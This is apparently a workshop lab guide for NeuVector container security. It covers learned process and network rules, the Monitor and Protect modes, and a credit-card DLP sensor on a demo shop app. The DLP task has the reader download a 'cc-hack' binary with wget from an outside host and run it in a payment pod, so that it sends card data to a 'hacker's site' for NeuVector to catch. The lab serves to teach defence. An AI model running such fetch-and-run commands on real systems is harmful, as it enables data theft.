# Lab 2 - Exploring Learning Behaviour of NeuVector

In this lab, we will experience first hand NeuVector capability to learn application behaviour of any microservices application, automatically discover all the valid east-west network traffic within the cluster, and generate the security code as Kubernetes CRD resources. We will also detect attack using Data Loss Prevention technique of NeuVector an exciting usecase for our micro-services boutique application.  

### Task 1 - Observe the application behaviour in NV

#### Task 1.1 - Observing your application network flow.

We have already done this previously in the task 1, while taking a look at the Network Tab. This give us a high level network communication flow. 

![Cluster1-NeuVector-Network-Filter-pg3](../images/Cluster1-NeuVector-Network-Filter-pg3.png)

Right click on the container - `eshop-online-boutique-frontend` . You can see the details of the pod along with other details. 

![Cluster1-NeuVector-Network-Activity-Filter-Applicationpod-Details](../images/Cluster1-NeuVector-Network-Activity-Filter-Applicationpod-Details.png)

Let see the similar information + lot more, Click on NeuVector > Policy > Groups > Filter `eshop` . 

NeuVector will present all the pods which are spun up by the micro services application in the namespace `eshop-demo`. We will see all the Services within the namespace & the Policy Mode which they are in & other information. NeuVector default mode is Discover. 

NeuVector prefix the services with nv.container-name which you can easily notice in the sample image below.

![Cluster1-Policy-Groups-Filter-eshop](../images/Cluster1-Policy-Groups-Filter-eshop.PNG)

Let's pick up one container to observe what NeuVector has learned about it. 

In our example, let's pick the `nv.eshop-demo-online-boutique-frontend.eshop-demo`

Click on the Process Profiles Rules - NeuVector shows all process which are spin up during container creation. 

Process Profile Rules

![Cluster1-NeuVector-Policy-Groups-Process-Profile-Rules](../images/Cluster1-NeuVector-Policy-Groups-Process-Profile-Rules.PNG)

Network Rules

![Cluster1-NeuVector-Policy-Network-Rules](../images/Cluster1-NeuVector-Policy-Network-Rules.PNG)

#### Task 1.2 - Realtime Process Profile Rule (whitelisting)

Earlier we had identified in the discovery mode, what process did the container start with. 

![Cluster1-NeuVector-Policy-Groups-Process-Profile-Rules](../images/Cluster1-NeuVector-Policy-Groups-Process-Profile-Rules.PNG)

NeuVector continuously watch the process inside the container.  Let's assume, we need to make some configuration changes to the configuration file residing on container's volume. For this we need access to the shell. Let see if NeuVector can identify new shell process when we access the shell in realtime. 

For this we need to go to Rancher 

Rancher > Cluster Management > Cluster1 > Cluster > Workload > Pods > Filter eshop-demo namespace and we should see all containers running in the namespace. 

Let's select the `eshop-demo-online-boutique-frontend-6798496f46-4sxcv` container and click on the 3 vertical dot on right hand side which further provide options. Select `ExecuteShell`  ![Cluster1-Access-to-frontend-conatainer-shell](../images/Cluster1-Access-to-frontend-conatainer-shell.png)

Access to the container shell. 

![Cluster1-Access-to-frontend-conatainer-shell-prompt-success](../images/Cluster1-Access-to-frontend-conatainer-shell-prompt-success.png)

Now let validate if NeuVector was able to identify the new shell process and no surprise, we do see the new process in NeuVector

NeuVector > Policy > Groups > Filter `frontend` > Process Profile Rules. 

![Cluster1-NeuVector-learned-new-process-shell](../images/Cluster1-NeuVector-learned-new-process-shell.png)

Similarly, we can check what Services are communicating with us & visa versa. 

NeuVector > Policy > Groups > Filter `frontend` > Network Rules Rules. 

![Cluster1-NeuVector-Policy-Network-Rules](../images/Cluster1-NeuVector-Policy-Network-Rules.PNG)

We can continue to test our application & observe the changes. 

In this way NeuVector can learn our application behaviour. we can continue to test the application & it will continue to learn & create whitelist rules. Once we happy with our testing we can have NeuVector change it's mode from Discovery to Monitor & or Protect 

While you are testing, you can start with Discovery to learn & than process to Monitor Mode. Monitor mode will report any volition based on the whitelisting Process & Network Rules we have create in Discovery mode & report them as Security Event.  

To change our application mode from Discovery to Monitor 

 NeuVector > Policy > Groups > Filter `frontend` > Switch Mode

![Cluster1-Switch-mode-discovery-monitor-pg1](../images/Cluster1-Switch-mode-discovery-monitor-pg1-1669313660415-28.png)

Selection of Mode - `Monitor`

![Cluster1-Switch-mode-discovery-monitor-pg2](../images/Cluster1-Switch-mode-discovery-monitor-pg2.PNG)

Confirmation of Change of Mode to Monitor

![Cluster1-Switch-mode-discovery-monitor-pg3](../images/Cluster1-Switch-mode-discovery-monitor-pg3.PNG)

Going forward any violations in Process/Network will be alerted and we can see them in Notification > Security Events.

If we toggle back to Rancher > Cluster Management > Cluster1 > Cluster > Workload > Pods > Filter eshop-demo namespace and we should see all containers running in the namespace. 

Execute into the shell & try & execute a ping command to any website of your choice, it will result in success, however since we have not kept the application service in Monitor Mode,we expect to see Security Event notifying that ping was never part of whitelisting rule & hence this was a violation and would be reported accordingly.   

![Cluster1-mode-monitor-proces-ping](../images/Cluster1-mode-monitor-proces-ping.png)

Viewing Process Violation

NeuVector > Notification > Security Event - Filter `www.google.com`

![Cluster1-mode-monitor-notification-security-event-violation-ping](../images/Cluster1-mode-monitor-notification-security-event-violation-ping.png)





Task 2 - Import/Export the learned application policy



-----

Task 3 - DLP 

In the NV UI - Policy > Group > Add Group

Name = `eshop-demo`

Criteria = `Namespace=eshop-demo`

![Group-add-eshop-demo-group](../images/Group-add-eshop-demo-group.PNG)

New Group created. 

![Group-add-eshop-demo-group-success](../images/Group-add-eshop-demo-group-success.PNG)



Click on the eshop-demo group, locate the DLP tab underneath, click edit button, check the creditcard DLP sensor (deny).

![Group-eshop-demo-dlp-page1](../images/Group-eshop-demo-dlp-page1.png)

Select Sensor.CreditCard & hit Apply.

![Group-eshop-demo-dlp-page](../images/Group-eshop-demo-dlp-page.PNG)

We now see the DLP successfully applied to the Group. 

![Group-eshop-demo-dlp-success-page2](../images/Group-eshop-demo-dlp-success-page2.png)

**Note - This does not automatically apply the same credit card sensor to all pods in eshop-demo namespace**

Now let's test the filter. For this we will move the Group we created into Monitor mode. 

In the Group, filter by "eshop", check all the pods in namespace eshop-demo. Click Switch Mode button.

1. Select "Monitor" mode, and use "Basic". Click Apply.

![Group-eshop-demo-switch-to-monitor-pg1](../images/Group-eshop-demo-switch-to-monitor-pg1.PNG)

Switching to Monitor Mode.

![Group-eshop-demo-switch-to-monitor-pg2](../images/Group-eshop-demo-switch-to-monitor-pg2.PNG)

![Group-eshop-demo-switch-to-monitor-success-pg3](../images/Group-eshop-demo-switch-to-monitor-success-pg3.PNG)

We will now impersonate as hacker to steal the data. 

For next step, we will switch to Rancher UI. 

1. Switch to Rancher UI
   1. Locate the pod "eshop...payment service", open the menu (execute shell)
   2. Key in the command script like above.
   3. This download the cc-hack agent into the pod, got executed. A customer's credit card number will then be sent to the hacker's site. And the hacker site will respond the same credit card number back to the agent.





`wget https://rancherworkshop.blob.core.windows.net/demoapp/cc-hack`
`chmod +x cc-hack`
`./cc-hack`





1. Switch to NV UI
   1. Navigate to the Notification > Security Events menu item inthe left navigation bar,
   2. You should notice the "card violation rule..."
2. In the same NV UI,
   1. In the Group, filter by "eshop", check all the pods in namespace eshop-demo. Click Switch Mode button. Change from "Monitor" mode to "Protect" mode. Use "Basic". Click Apply.
3. Switch to the Ranch UI, in the same payment service pod, open the shell, execuite the ./cc-hack program. It should have been killed right away as protected by NV.
4. Same notification in NV security events UI will also be alerted.
5. Further to this, we can define response rules on the security events to notify the operator in case those "interesting" events are being triggered. (Beyond the scope of this workshop, ask our solution architct if yo are interested.)

In the security events of "card violation rule", click the "View packet" to show the details of the packet and examine which card has been exposed.

Export the Application Lean Behaviour to new clusters (steps

)

If you wish to add DLP & WAF Rules, 

![Cluster1-NeuVector-Policy-Add-DLP-WAF](../images/Cluster1-NeuVector-Policy-Add-DLP-WAF.png)

DLP Rule added

![Cluster1-NeuVector-Policy-DLP](../images/Cluster1-NeuVector-Policy-DLP.PNG)



WAF Rules

![Cluster1-NeuVector-Policy-WAF](../images/Cluster1-NeuVector-Policy-WAF.PNG)



